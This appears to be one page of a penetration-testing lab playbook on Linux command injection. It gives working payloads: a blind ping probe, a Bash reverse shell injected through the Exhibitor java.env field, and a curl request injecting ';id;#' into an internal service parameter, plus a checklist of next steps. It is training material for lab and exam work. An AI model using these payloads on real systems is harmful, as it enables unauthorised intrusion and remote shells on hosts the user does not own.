# Linux - Command Injection

**Step 8A of 50 · Linux**

*Confirm that a web input reaches a shell, prove blind execution safely, then turn it into a shell or use it to reach an internal service.*

## When to use this page

Use this page when a web form, URL parameter, or management panel appears to place your input inside an operating-system command. Command injection means the application gives shell syntax to your input. Test with a harmless signal before sending a callback.

## Blind confirmation with ping

Use this when the page does not print command output. A ping packet arriving at your Kali VPN interface proves that the target executed the injected command.

> **Why:** This command starts a packet capture so you can see the harmless ICMP request generated by the test payload.
```bash
sudo tcpdump -i tun0 icmp
```

> **Why:** This payload asks the application to send one ICMP packet to your Kali host; look for the packet in tcpdump, not for text in the web response.
```text
$(ping -c 1 $LocalIP)
```

## Exhibitor `java.env` injection

Use this branch when Apache ZooKeeper Exhibitor exposes an unauthenticated configuration form with a `java.env` field. The field is interpreted as shell content by the service startup path, so the first test should be a ping and the second can be a reverse shell.

> **Why:** This browser submission places a harmless command in the field that Exhibitor executes; a ping callback confirms code execution before you attempt a shell.
```text
$(ping -c 1 $LocalIP)
```

> **Why:** This payload backgrounds a Bash reverse shell so the web request can finish while the listener receives the callback; replace the form field value only after the ping test succeeds.
```text
$(/bin/bash -i >& /dev/tcp/$LocalIP/$Port 0>&1 &)
```

## Internal `log_file` injection

Use this branch after local enumeration or port forwarding shows a monitoring service bound to loopback. A loopback service can be reached from the target itself even when Kali cannot connect directly. Keep the parameter present but empty when the application expects `analyze_log=`.

> **Why:** This request reaches the service from the target shell and appends a command separator, command, and shell comment; success is command output or a measurable side effect from the internal service.
```bash
curl -s "http://localhost:$WebPort/?analyze_log=;id;#"
```

## Example output

```text
tcpdump: ICMP echo request from $BoxIP
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## What did you get?

- [ ] A ping arrives → **Record the callback in the `tcpdump` window, run the matching Exhibitor or internal-service command from this page, catch the shell, and go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] Command output is reflected → **Submit `id` in the same parameter, confirm the response contains `uid=`, then send the documented reverse shell and go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] No response but the internal service is reachable → **Resubmit the request with the documented parameter name and a harmless `id` probe, then check the HTTP response and listener output**
- [ ] No ping arrives → **Treat this as a dead end for this input; return to Step 5 · [[Linux - Web Enum]] or Step 10 · [[Linux - Exploit Search]]**
- [ ] A shell arrives as root → **Run `id` and `whoami` to confirm UID 0, record the proof path privately, then go to Step 21 · [[Linux - Clean Down]]**

## Notes

`$LocalIP` is the Kali VPN address. `$Port` is the listener port. A reverse shell is a connection from the target back to Kali; a bind shell listens on the target and requires an inbound connection.

## Gotcha

> [!warning] 💡
> `/dev/tcp` is Bash syntax. If the vulnerable process invokes `/bin/sh`, use a POSIX-compatible payload or a Python callback instead. Keep the first probe harmless so a quoting mistake does not damage the target.
